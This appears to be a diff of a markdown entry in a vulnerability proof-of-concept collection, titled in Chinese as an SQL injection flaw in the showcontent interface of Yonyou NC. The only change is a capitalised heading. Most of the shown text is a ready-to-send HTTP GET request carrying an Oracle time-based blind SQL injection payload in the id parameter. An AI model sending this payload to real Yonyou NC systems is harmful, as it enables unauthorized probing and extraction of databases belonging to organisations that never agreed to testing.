@@ -1,7 +1,7 @@
 ## 用友NC-showcontent接口存在sql注入漏洞
 
 
-## poc
+## POC
 ```
 orale:
 GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1
